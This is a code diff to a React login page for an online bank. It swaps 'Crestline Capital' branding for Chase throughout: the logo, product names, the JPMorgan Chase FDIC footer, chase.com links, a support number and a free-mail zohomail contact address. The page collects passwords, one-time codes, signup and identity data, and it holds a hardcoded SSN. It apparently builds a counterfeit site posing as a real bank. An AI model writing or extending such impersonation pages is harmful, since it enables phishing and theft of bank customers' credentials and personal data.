@@ -145,14 +145,14 @@ export function LoginPage({ onLogin }: LoginPageProps) {
   const defaultUserProfile = {
     id: "user1",
     name: "CHUN HUNG",
-    email: "security@crestlinecapital.com",
+    email: "security@chasecapital.com",
     phone: "+1 (702) 886-4745",
     address: "34B Philadelphia, Pennsylvania PA, USA",
     dateOfBirth: "1961-08-24",
     ssn: "697-03-2642",
     memberSince: "August 1988",
     profilePicture: "",
-    tier: "Crestline Capital Private Client",
+    tier: "Chase Private Client",
   }
 
   const DEFAULT_USERNAME = "CHUN HUNG"
@@ -160,12 +160,12 @@ export function LoginPage({ onLogin }: LoginPageProps) {
   const DEFAULT_EMAIL = "chun.hung@demo.example.com"
 
   useEffect(() => {
-    const savedUsers = localStorage.getItem("Crestline_users")
+    const savedUsers = localStorage.getItem("Chase_users")
     if (savedUsers) {
       setStoredUsers(JSON.parse(savedUsers))
     }
 
-    const rememberedUsername = localStorage.getItem("Crestline_username")
+    const rememberedUsername = localStorage.getItem("Chase_username")
     if (rememberedUsername) {
       setUsername(rememberedUsername)
     }
@@ -277,34 +277,34 @@ export function LoginPage({ onLogin }: LoginPageProps) {
         console.log("[v0] Login successful, user ID:", loginData.userId)
         
         // Create session with full user data
-        localStorage.setItem("Crestline_logged_in", "true")
-        localStorage.setItem("Crestline_remember_me", rememberMe ? "true" : "false")
-        localStorage.setItem("Crestline_last_login", new Date().toISOString())
-        localStorage.setItem("Crestline_session_token", `token_${Date.now()}`)
-        localStorage.setItem("Crestline_user_id", loginData.userId)
+        localStorage.setItem("Chase_logged_in", "true")
+        localStorage.setItem("Chase_remember_me", rememberMe ? "true" : "false")
+        localStorage.setItem("Chase_last_login", new Date().toISOString())
+        localStorage.setItem("Chase_session_token", `token_${Date.now()}`)
+        localStorage.setItem("Chase_user_id", loginData.userId)
         
         // Store user data from backend
         if (loginData.user) {
-          localStorage.setItem("Crestline_user_data", JSON.stringify(loginData.user))
-          localStorage.setItem("Crestline_user_role", loginData.user.role || "user")
-          localStorage.setItem("Crestline_user_name", loginData.user.name || "")
-          localStorage.setItem("Crestline_user_email", loginData.user.email || "")
+          localStorage.setItem("Chase_user_data", JSON.stringify(loginData.user))
+          localStorage.setItem("Chase_user_role", loginData.user.role || "user")
+          localStorage.setItem("Chase_user_name", loginData.user.name || "")
+          localStorage.setItem("Chase_user_email", loginData.user.email || "")
         }
 
         // Store accounts data from backend
         if (loginData.accounts) {
-          localStorage.setItem("Crestline_user_accounts", JSON.stringify(loginData.accounts))
+          localStorage.setItem("Chase_user_accounts", JSON.stringify(loginData.accounts))
         }
 
         if (rememberMe) {
-          localStorage.setItem("Crestline_username", username)
+          localStorage.setItem("Chase_username", username)
         } else {
-          localStorage.removeItem("Crestline_username")
+          localStorage.removeItem("Chase_username")
         }
 
         toast({
           title: "Welcome back",
-          description: "You have successfully signed in to Crestline Capital.",
+          description: "You have successfully signed in to Chase.",
         })
 
         setIsLoading(false)
@@ -470,7 +470,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
         const updatedUsers = [...storedUsers]
         updatedUsers[userIndex].password = newPassword
         setStoredUsers(updatedUsers)
-        localStorage.setItem("Crestline_users", JSON.stringify(updatedUsers))
+        localStorage.setItem("Chase_users", JSON.stringify(updatedUsers))
       } else {
         // If not found in storedUsers and not the default user, show an error
         toast({
@@ -794,7 +794,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           const { sendSecurityTokenEmail } = await import("@/lib/email-service")
           const tokenResult = await sendSecurityTokenEmail({
             userEmail: signupData.email,
-            adminEmail: "security@crestlinecapital.com",
+            adminEmail: "security@chasecapital.com",
             userName: signupData.firstName,
             tokenType: "signup",
           })
@@ -816,15 +816,15 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
         const updatedUsers = [...storedUsers, newUser]
         setStoredUsers(updatedUsers)
-        localStorage.setItem("Crestline_users", JSON.stringify(updatedUsers))
+        localStorage.setItem("Chase_users", JSON.stringify(updatedUsers))
 
         // Store the new user's ID and account number
-        localStorage.setItem("Crestline_new_user_id", data.userId)
-        localStorage.setItem("Crestline_new_account_number", data.accountNumber || "")
+        localStorage.setItem("Chase_new_user_id", data.userId)
+        localStorage.setItem("Chase_new_account_number", data.accountNumber || "")
 
         toast({
           title: "Account Created Successfully",
-          description: `Welcome to Crestline Capital! Your account number is ${data.maskedAccountNumber || "ready"}. You can now sign in with your credentials.`,
+          description: `Welcome to Chase! Your account number is ${data.maskedAccountNumber || "ready"}. You can now sign in with your credentials.`,
         })
 
         // Pre-fill the username for convenience
@@ -868,7 +868,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
     try {
       // Get the current logged-in user or create a temp user session
-      const currentUser = localStorage.getItem("Crestline_current_user")
+      const currentUser = localStorage.getItem("Chase_current_user")
       let userId = currentUser ? JSON.parse(currentUser).id : "guest_user_" + Date.now()
 
       // Call the account opening API
@@ -938,7 +938,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
       <div className="fixed inset-0 bg-black/50 z-50 flex items-end sm:items-center justify-center">
         <div className="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-3xl max-h-[90vh] overflow-y-auto animate-in slide-in-from-bottom duration-300">
           {/* Modal Header */}
-          <div className="sticky top-0 bg-[#117aca] text-white p-4 flex items-center justify-between sm:rounded-t-2xl">
+          <div className="sticky top-0 bg-[#117aca] text-gray-900 p-4 flex items-center justify-between sm:rounded-t-2xl">
             <button onClick={closeModal} className="p-1 hover:bg-white/20 rounded-full transition-colors">
               {modalView === "forgot-username" ||
               modalView === "forgot-password" ||
@@ -985,7 +985,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
             </button>
             <div className="flex items-center gap-2">
               <span className="font-bold text-lg">CRESTLINE</span>
-              <Image src="/images/Crestline-logo.png" alt="Crestline Capital" width={28} height={28} className="rounded" />
+              <Image src="/images/Chase-logo.png" alt="Chase" width={28} height={28} className="rounded" />
             </div>
             <div className="w-8"></div>
           </div>
@@ -1043,7 +1043,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                   className="w-full p-4 border-2 border-[#117aca] rounded-xl hover:bg-blue-50 transition-all flex items-center gap-4 bg-blue-50"
                 >
                   <div className="w-12 h-12 bg-[#117aca] rounded-full flex items-center justify-center">
-                    <Shield className="w-6 h-6 text-white" />
+                    <Shield className="w-6 h-6 text-gray-900" />
                   </div>
                   <div className="text-left">
                     <p className="font-semibold text-gray-900">Verify Your Identity</p>
@@ -1060,7 +1060,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                   </div>
                   <div className="text-left">
                     <p className="font-semibold text-gray-900">Forgot Username</p>
-                    <p className="text-sm text-gray-500">Recover your Crestline Capital username</p>
+                    <p className="text-sm text-gray-500">Recover your Chase username</p>
                   </div>
                 </button>
 
@@ -1073,7 +1073,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                   </div>
                   <div className="text-left">
                     <p className="font-semibold text-gray-900">Forgot Password</p>
-                    <p className="text-sm text-gray-500">Reset your Crestline Capital password</p>
+                    <p className="text-sm text-gray-500">Reset your Chase password</p>
                   </div>
                 </button>
               </div>
@@ -1084,7 +1084,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                   <div>
                     <p className="text-sm font-medium text-gray-900">Security Tip</p>
                     <p className="text-xs text-gray-600">
-                      Crestline Capital will never ask for your full password or PIN via email or phone.
+                      Chase will never ask for your full password or PIN via email or phone.
                     </p>
                   </div>
                 </div>
@@ -1354,7 +1354,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
             </div>
           )}
 
-          {/* Identity Verification Modal - Matches Crestline Capital UX */}
+          {/* Identity Verification Modal - Matches Chase UX */}
           {modalView === "identify" && (
             <div className="p-6">
               <h2 className="text-2xl font-bold text-gray-900 mb-2">Identification</h2>
@@ -1614,7 +1614,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           {/* Sign Up Modal */}
           {modalView === "signup" && (
             <div className="p-6">
-              <h2 className="text-xl font-bold text-gray-900 mb-2">Sign up for Crestline Capital Online</h2>
+              <h2 className="text-xl font-bold text-gray-900 mb-2">Sign up for Chase Online</h2>
               <p className="text-gray-600 mb-6">Access your accounts anytime, anywhere.</p>
 
               <div className="space-y-4">
@@ -1626,7 +1626,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     <CreditCard className="w-6 h-6 text-[#117aca]" />
                   </div>
                   <div className="text-left flex-1">
-                    <p className="font-semibold text-gray-900">I have a Crestline Capital account</p>
+                    <p className="font-semibold text-gray-900">I have a Chase account</p>
                     <p className="text-sm text-gray-500">Sign up for online access to your existing account</p>
                   </div>
                 </button>
@@ -1639,14 +1639,14 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     <Building2 className="w-6 h-6 text-green-600" />
                   </div>
                   <div className="text-left flex-1">
-                    <p className="font-semibold text-gray-900">I'm new to Crestline Capital</p>
-                    <p className="text-sm text-gray-500">Open a new Crestline Capital account today</p>
+                    <p className="font-semibold text-gray-900">I'm new to Chase</p>
+                    <p className="text-sm text-gray-500">Open a new Chase account today</p>
                   </div>
                 </button>
               </div>
 
               <div className="mt-6 p-4 bg-blue-50 rounded-xl">
-                <h3 className="font-semibold text-gray-900 mb-2">Benefits of Crestline Capital Online</h3>
+                <h3 className="font-semibold text-gray-900 mb-2">Benefits of Chase Online</h3>
                 <ul className="text-sm text-gray-600 space-y-2">
                   <li className="flex items-center gap-2">
                     <Check className="w-4 h-4 text-green-600" /> 24/7 account access
@@ -1673,7 +1673,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                   <div key={step} className="flex items-center">
                     <div
                       className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
-                        signupStep >= step ? "bg-[#117aca] text-white" : "bg-gray-200 text-gray-500"
+                        signupStep >= step ? "bg-[#117aca] text-gray-900" : "bg-gray-200 text-gray-500"
                       }`}
                     >
                       {signupStep > step ? <Check className="w-4 h-4" /> : step}
@@ -1864,7 +1864,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                           className="mt-0.5"
                         />
                         <span className="text-sm text-gray-600">
-                          I agree to receive electronic communications from Crestline Capital
+                          I agree to receive electronic communications from Chase
                         </span>
                       </label>
                     </div>
@@ -1885,7 +1885,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           {/* Open Account Modal */}
           {modalView === "open-account" && (
             <div className="p-6">
-              <h2 className="text-xl font-bold text-gray-900 mb-2">Open a Crestline Capital Account</h2>
+              <h2 className="text-xl font-bold text-gray-900 mb-2">Open a Chase Account</h2>
               <p className="text-gray-600 mb-6">Choose the account that's right for you.</p>
 
               <div className="space-y-3">
@@ -1899,7 +1899,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     </div>
                     <div className="flex-1">
                       <p className="font-semibold text-gray-900">Checking Account</p>
-                      <p className="text-sm text-gray-500">Crestline Capital Total Checking - $0 deposit to open</p>
+                      <p className="text-sm text-gray-500">Chase Total Checking - $0 deposit to open</p>
                     </div>
                   </div>
                 </button>
@@ -1914,7 +1914,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     </div>
                     <div className="flex-1">
                       <p className="font-semibold text-gray-900">Savings Account</p>
-                      <p className="text-sm text-gray-500">Crestline Capital Savings - Earn interest on your balance</p>
+                      <p className="text-sm text-gray-500">Chase Savings - Earn interest on your balance</p>
                     </div>
                   </div>
                 </button>
@@ -1929,13 +1929,13 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     </div>
                     <div className="flex-1">
                       <p className="font-semibold text-gray-900">Credit Card</p>
-                      <p className="text-sm text-gray-500">Crestline Capital Freedom, Sapphire, and more</p>
+                      <p className="text-sm text-gray-500">Chase Freedom, Sapphire, and more</p>
                     </div>
                   </div>
                 </button>
 
                 <button
-                  onClick={() => window.open("https://www.Crestline.com/personal/investments", "_blank")}
+                  onClick={() => window.open("https://www.Chase.com/personal/investments", "_blank")}
                   className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                 >
                   <div className="flex items-center gap-4">
@@ -1952,7 +1952,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
               <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                 <p className="text-xs text-gray-600">
-                  <strong>Need help choosing?</strong> Call us at 1-800-935-9935 or visit a Crestline Capital branch near you.
+                  <strong>Need help choosing?</strong> Call us at 1-800-935-9935 or visit a Chase branch near you.
                 </p>
               </div>
             </div>
@@ -1961,9 +1961,9 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           {/* Account Type Details */}
           {modalView === "account-type" && (
             <div className="p-6">
-              <h2 className="text-xl font-bold text-gray-900 mb-4">Crestline Capital Total Checking</h2>
+              <h2 className="text-xl font-bold text-gray-900 mb-4">Chase Total Checking</h2>
 
-              <div className="bg-gradient-to-r from-[#117aca] to-[#0a5a9e] text-white p-6 rounded-xl mb-6">
+              <div className="bg-gradient-to-r from-[#117aca] to-[#0a5a9e] text-gray-900 p-6 rounded-xl mb-6">
                 <p className="text-3xl font-bold">$300</p>
                 <p className="text-sm opacity-90">New account bonus when you set up direct deposit</p>
               </div>
@@ -1973,11 +1973,11 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                 <ul className="space-y-3">
                   <li className="flex items-start gap-3">
                     <Check className="w-5 h-5 text-green-600 mt-0.5" />
-                    <span className="text-sm text-gray-600">Access to 15,000+ Crestline Capital ATMs and 4,700+ branches</span>
+                    <span className="text-sm text-gray-600">Access to 15,000+ Chase ATMs and 4,700+ branches</span>
                   </li>
                   <li className="flex items-start gap-3">
                     <Check className="w-5 h-5 text-green-600 mt-0.5" />
-                    <span className="text-sm text-gray-600">Crestline Capital Mobile app with mobile check deposit</span>
+                    <span className="text-sm text-gray-600">Chase Mobile app with mobile check deposit</span>
                   </li>
                   <li className="flex items-start gap-3">
                     <Check className="w-5 h-5 text-green-600 mt-0.5" />
@@ -2067,7 +2067,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     onChange={(e) => setFundingSource(e.target.value)}
                     className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#117aca] focus:ring-1 focus:ring-[#117aca]"
                   >
-                    <option value="existing-account">Existing Crestline Capital Account</option>
+                    <option value="existing-account">Existing Chase Account</option>
                     <option value="debit-card">Debit Card</option>
                     <option value="wire-transfer">Wire Transfer</option>
                     <option value="none">No Initial Deposit</option>
@@ -2083,7 +2083,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                     className="mt-1 w-4 h-4 text-[#117aca] rounded focus:ring-[#117aca]"
                   />
                   <label className="text-xs text-gray-600">
-                    I agree to the Crestline Capital Bank Terms of Service and understand that this account will be opened immediately upon confirmation. Funds will be available in real-time.
+                    I agree to the Chase Bank Terms of Service and understand that this account will be opened immediately upon confirmation. Funds will be available in real-time.
                   </label>
                 </div>
               </div>
@@ -2176,7 +2176,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
               <div className="mt-4 p-4 bg-gray-50 rounded-xl">
                 <p className="text-xs text-gray-600">
-                  <strong>Report suspicious activity:</strong> Call 1-800-935-9935 or visit Crestline.com/reportfraud
+                  <strong>Report suspicious activity:</strong> Call 1-800-935-9935 or visit Chase.com/reportfraud
                 </p>
               </div>
             </div>
@@ -2189,7 +2189,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
               <div className="space-y-3">
                 <button
-                  onClick={() => window.open("https://locator.Crestline.com/", "_blank")}
+                  onClick={() => window.open("https://locator.Chase.com/", "_blank")}
                   className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                 >
                   <div className="flex items-center gap-3">
@@ -2200,7 +2200,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                 </button>
 
                 <button
-                  onClick={() => window.open("https://www.Crestline.com/personal/credit-cards", "_blank")}
+                  onClick={() => window.open("https://www.Chase.com/personal/credit-cards", "_blank")}
                   className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                 >
                   <div className="flex items-center gap-3">
@@ -2211,7 +2211,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                 </button>
 
                 <button
-                  onClick={() => window.open("https://www.Crestline.com/personal/mortgage", "_blank")}
+                  onClick={() => window.open("https://www.Chase.com/personal/mortgage", "_blank")}
                   className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                 >
                   <div className="flex items-center gap-3">
@@ -2222,7 +2222,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                 </button>
 
                 <button
-                  onClick={() => window.open("https://www.Crestline.com/business", "_blank")}
+                  onClick={() => window.open("https://www.Chase.com/business", "_blank")}
                   className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                 >
                   <div className="flex items-center gap-3">
@@ -2233,7 +2233,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                 </button>
 
                 <button
-                  onClick={() => window.open("mailto:Crestline.org_info247@zohomail.com", "_blank")}
+                  onClick={() => window.open("mailto:Chase.org_info247@zohomail.com", "_blank")}
                   className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                 >
                   <div className="flex items-center gap-3">
@@ -2298,34 +2298,34 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                       console.log("[v0] OTP verified successfully")
 
                       // Create session with full user data from backend
-                      localStorage.setItem("Crestline_logged_in", "true")
-                      localStorage.setItem("Crestline_remember_me", rememberMe ? "true" : "false")
-                      localStorage.setItem("Crestline_last_login", new Date().toISOString())
-                      localStorage.setItem("Crestline_session_token", `token_${Date.now()}`)
-                      localStorage.setItem("Crestline_user_id", twoFAUserId)
+                      localStorage.setItem("Chase_logged_in", "true")
+                      localStorage.setItem("Chase_remember_me", rememberMe ? "true" : "false")
+                      localStorage.setItem("Chase_last_login", new Date().toISOString())
+                      localStorage.setItem("Chase_session_token", `token_${Date.now()}`)
+                      localStorage.setItem("Chase_user_id", twoFAUserId)
 
                       // Store user data from backend response
                       if (verifyData.user) {
-                        localStorage.setItem("Crestline_user_data", JSON.stringify(verifyData.user))
-                        localStorage.setItem("Crestline_user_role", verifyData.user.role || "user")
-                        localStorage.setItem("Crestline_user_name", verifyData.user.name || "")
-                        localStorage.setItem("Crestline_user_email", verifyData.user.email || "")
+                        localStorage.setItem("Chase_user_data", JSON.stringify(verifyData.user))
+                        localStorage.setItem("Chase_user_role", verifyData.user.role || "user")
+                        localStorage.setItem("Chase_user_name", verifyData.user.name || "")
+                        localStorage.setItem("Chase_user_email", verifyData.user.email || "")
                       }
 
                       // Store accounts data from backend
                       if (verifyData.accounts) {
-                        localStorage.setItem("Crestline_user_accounts", JSON.stringify(verifyData.accounts))
+                        localStorage.setItem("Chase_user_accounts", JSON.stringify(verifyData.accounts))
                       }
 
                       if (rememberMe) {
-                        localStorage.setItem("Crestline_username", username)
+                        localStorage.setItem("Chase_username", username)
                       } else {
-                        localStorage.removeItem("Crestline_username")
+                        localStorage.removeItem("Chase_username")
                       }
 
                       toast({
                         title: "Welcome back",
-                        description: "You have successfully signed in to Crestline Capital.",
+                        description: "You have successfully signed in to Chase.",
                       })
 
                       setIsLoading(false)
@@ -2381,8 +2381,8 @@ export function LoginPage({ onLogin }: LoginPageProps) {
       {/* Header with CRESTLINE logo */}
       <div className="py-8 flex justify-center items-center">
         <div className="flex items-center gap-2">
-          <span className="text-white text-2xl font-bold tracking-wide">CRESTLINE</span>
-          <Image src="/images/Crestline-logo.png" alt="Crestline Capital" width={36} height={36} className="rounded" />
+          <span className="text-gray-900 text-2xl font-bold tracking-wide">CRESTLINE</span>
+          <Image src="/images/Chase-logo.png" alt="Chase" width={36} height={36} className="rounded" />
         </div>
       </div>
 
@@ -2464,8 +2464,8 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                       const userEmail = username || "your registered email"
                       const result = await sendSecurityTokenEmail({
                         userEmail: userEmail,
-                        adminEmail: "security@crestlinecapital.com",
-                        userName: username || "Crestline Capital User",
+                        adminEmail: "security@chasecapital.com",
+                        userName: username || "Chase User",
                         tokenType: "login",
                       })
 
@@ -2525,8 +2525,8 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                       const userEmail = username || "your registered email"
                       const result = await sendSecurityTokenEmail({
                         userEmail: userEmail,
-                        adminEmail: "security@crestlinecapital.com",
-                        userName: username || "Crestline Capital User",
+                        adminEmail: "security@chasecapital.com",
+                        userName: username || "Chase User",
                         tokenType: "login",
                       })
                       if (result.success) {
@@ -2566,8 +2566,8 @@ export function LoginPage({ onLogin }: LoginPageProps) {
                       const userEmail = username || "your registered email"
                       const result = await sendSecurityTokenEmail({
                         userEmail: userEmail,
-                        adminEmail: "security@crestlinecapital.com",
-                        userName: username || "Crestline Capital User",
+                        adminEmail: "security@chasecapital.com",
+                        userName: username || "Chase User",
                         tokenType: "login",
                       })
                       if (result.success) {
@@ -2597,7 +2597,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           <Button
             onClick={handleSignIn}
             disabled={isLoading}
-            className="w-full bg-[#117aca] hover:bg-[#0a5a9e] text-white py-6 rounded-md text-base font-medium transition-colors border-2 border-[#117aca]"
+            className="w-full bg-[#117aca] hover:bg-[#0a5a9e] text-gray-900 py-6 rounded-md text-base font-medium transition-colors border-2 border-[#117aca]"
           >
             {isLoading ? (
               <div className="flex items-center gap-2">
@@ -2642,7 +2642,7 @@ export function LoginPage({ onLogin }: LoginPageProps) {
               onClick={() => setModalView("signup")} 
               className="w-full p-3 border-2 border-[#117aca] text-[#117aca] rounded-lg hover:bg-blue-50 transition-colors font-medium text-sm"
             >
-              Sign up for Crestline Capital online
+              Sign up for Chase online
             </button>
             <button 
               onClick={() => setModalView("open-account")} 
@@ -2675,21 +2675,21 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
       {/* Footer - Equal Housing Lender, FDIC, Copyright - Updated year to 2025 */}
       <div className="pb-6 pt-4 text-center space-y-2 px-4">
-        <div className="flex items-center justify-center gap-1 text-xs text-white/80">
+        <div className="flex items-center justify-center gap-1 text-xs text-gray-900/80">
           <HomeIcon className="w-4 h-4" />
           <span>Equal Housing Lender</span>
         </div>
-        <p className="text-xs text-white/80 leading-relaxed">
-          Deposit products provided by JPMorgan Crestline Capital Bank, N.A.
+        <p className="text-xs text-gray-900/80 leading-relaxed">
+          Deposit products provided by JPMorgan Chase Bank, N.A.
           <br />
           Member FDIC
         </p>
-        <p className="text-xs text-white/80 leading-relaxed">
-          Credit cards are issued by JPMorgan Crestline Capital Bank, N.A.
+        <p className="text-xs text-gray-900/80 leading-relaxed">
+          Credit cards are issued by JPMorgan Chase Bank, N.A.
           <br />
           Member FDIC
         </p>
-        <p className="text-xs text-white/80 mt-2">© 2025 JPMorgan Crestline Capital & Co.</p>
+        <p className="text-xs text-gray-900/80 mt-2">© 2025 JPMorgan Chase & Co.</p>
       </div>
 
       {renderModal()}
